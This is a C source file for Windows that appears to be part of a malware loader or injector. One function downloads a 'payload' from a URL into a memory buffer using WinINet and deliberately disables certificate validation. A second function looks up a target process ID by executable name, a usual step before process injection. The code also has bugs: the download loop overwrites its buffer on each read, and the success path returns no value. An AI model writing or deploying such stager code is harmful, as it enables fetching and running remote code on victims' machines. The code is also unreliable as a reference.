#include <Windows.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "getpayload.h"

#pragma comment(lib,"wininet")

# define BUFFER_SIZE 1024000
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA 0x00000100

DWORD GetPayloadFromURL(LPWSTR lpUrl, LPVOID image, DWORD dwSize) {
	PVOID mem, base;
	int i = 0;

	HINTERNET hInternetSession;
	HINTERNET hURL;
	HANDLE hReq;
	DWORD dwBytesRead = 1;

	printf("\n[+] Connecting to URL for downloading payload");

	WCHAR hostname[1024], fileUrlPath[1024], scheme[1024];
	URL_COMPONENTS urlcomponents;
	memset(&urlcomponents, 0, sizeof(urlcomponents));
	urlcomponents.dwStructSize = sizeof(URL_COMPONENTS);
	urlcomponents.dwHostNameLength = 1024;
	urlcomponents.dwUrlPathLength = 1024;
	urlcomponents.dwSchemeLength = 1024;
	urlcomponents.lpszHostName = hostname;
	urlcomponents.lpszUrlPath = fileUrlPath;
	urlcomponents.lpszScheme = scheme;
	if (!InternetCrackUrl(lpUrl, lstrlenW(lpUrl), 0, &urlcomponents)) {
		printf("\n[-] Error parsing the URL: %d", GetLastError());
		return -1;
	}
	hInternetSession = InternetOpen(L"sim-ba", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hURL = InternetConnect(hInternetSession, hostname, urlcomponents.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (lstrcmpiW(scheme, L"https") == 0) {
		printf("\n[*] Connecting using HTTPS");
		hReq = HttpOpenRequest(hURL, L"GET", fileUrlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);
	}
	else {
		hReq = HttpOpenRequest(hURL, L"GET", fileUrlPath, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
	}
	HttpSendRequest(hReq, NULL, 0, NULL, 0);
	if (GetLastError() == ERROR_INTERNET_INVALID_CA) {
		printf("\n[*] Ignoring SSL Certificate Error");
		DWORD dwFlags;
		DWORD dwBuffLen = sizeof(dwFlags);
		InternetQueryOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen);
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
		InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}

	if (!HttpSendRequest(hReq, NULL, 0, NULL, 0)) {
		printf("\n[-] Error Sending Http Request: %d", GetLastError());
		return -1;
	}

	for (; dwBytesRead > 0;)
	{
		InternetReadFile(hReq, image, dwSize, &dwBytesRead);
	}

	InternetCloseHandle(hURL);
	InternetCloseHandle(hInternetSession);
}

DWORD GetPIDFromName(const wchar_t* procName) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (lstrcmpW(entry.szExeFile, procName) == 0)
			{
				return entry.th32ProcessID;

			}
		}
	}

	CloseHandle(snapshot);

	return 0;
}